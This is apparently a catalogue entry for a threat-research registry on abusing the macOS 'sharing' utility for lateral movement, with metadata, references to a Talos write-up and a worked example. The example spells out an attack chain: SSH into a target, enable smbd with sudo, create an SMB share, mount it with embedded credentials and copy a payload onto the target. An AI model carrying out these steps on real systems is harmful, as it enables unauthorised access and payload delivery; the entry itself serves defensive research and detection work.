---
trust_level: community
id: macos-lateral-movement-sharing
namespace: macos:lateralmovement:sharing
name: sharing
description: Create and manage macOS file sharing points for SMB, AFP, and FTP.
author: Ryan Conry (Cisco Talos)
version: 1.0.0
capabilities:
- network.lateralmovement
platforms:
- macos
techniques:
- lateral-movement
execution:
  template: sharing
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: 'Create an SMB share on a target over SSH for lateral tool transfer:
    With SSH access to the target, the sharing utility can create an SMB share pointing
    to a directory on the target. Combined with the macOS smbd LaunchDaemon, the share
    becomes accessible over the network. The attacker can then mount the share using
    osascript and copy files directly into it, which appear immediately in the target''s
    share directory. The -s 001 flag enables SMB access on the share.'
  command: '# On target (via SSH): create share directory, start smbd, create the
    share

    ssh user@<TARGET_IP> ''mkdir -p ~/share && sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smbd.plist
    && sudo sharing -a /Users/user/share -n share -s 001''


    # On attacker: mount the share using osascript and transfer a file

    osascript -e ''mount volume "smb://user:<PASSWORD>@<TARGET_IP>/share"''

    cp payload.sh /Volumes/share/'
install:
- method: custom
  commands:
  - /usr/sbin/sharing
detections:
- type: other
  description: No detections at time of publishing
references:
- label: sharing man page
  url: https://ss64.com/mac/sharing.html
- label: 'Bad Apples: Weaponizing Native macOS Primitives for Movement and Execution'
  url: https://blog.talosintelligence.com/bad-apples-weaponizing-native-macos-primitives-for-movement-and-execution/
features:
- file-system
- local
- network-intensive
---

sharing (/usr/sbin/sharing) is a macOS command-line utility for creating and managing network file sharing points. It can add, remove, and list shared directories for SMB, AFP, and FTP protocols. In a lateral movement context, an attacker with SSH access to a target can use sharing to create an SMB share on the target, then mount that share from an attacker-controlled machine to transfer files directly to the target's filesystem without additional tooling.
